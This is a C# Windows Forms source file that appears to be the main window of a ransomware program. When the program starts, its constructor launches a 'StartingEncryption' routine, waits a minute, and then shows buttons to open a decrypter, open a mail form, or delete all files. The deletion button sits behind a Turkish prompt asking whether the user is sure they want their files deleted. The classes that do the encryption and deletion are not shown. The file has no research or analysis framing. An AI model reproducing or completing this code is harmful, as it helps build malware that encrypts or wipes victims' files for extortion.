﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Timers;

namespace WindowsFormsApplication1
{
    public partial class Form1 : Form
    {
        StartingEncryption x;

        public Form1()
        {
            x = new StartingEncryption();
            x.startEncryptAction();

            System.Threading.Thread.Sleep(60000);
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }

        private void button2_Click(object sender, EventArgs e)//mavi
        {
            Decrypter decrypter = new Decrypter();
            this.Hide();
            decrypter.Show();
        }

        private void button1_Click(object sender, EventArgs e)//kırmızı
        {
            var result = MessageBox.Show("Dosyalarınızı Silmek Için Emin Misiniz", "Are You Ready", MessageBoxButtons.YesNo);
            if (result==DialogResult.Yes)
            {
                DeleteAllFile hell = new DeleteAllFile();
                hell.StartGoToHell();
                MessageBox.Show("Sorry :(");
            }
        }

        private void button3_Click(object sender, EventArgs e)//mail buton
        {
            Mail mail = new Mail();
            this.Hide();
            mail.Show();
        }
             
    }//class
}//namespace
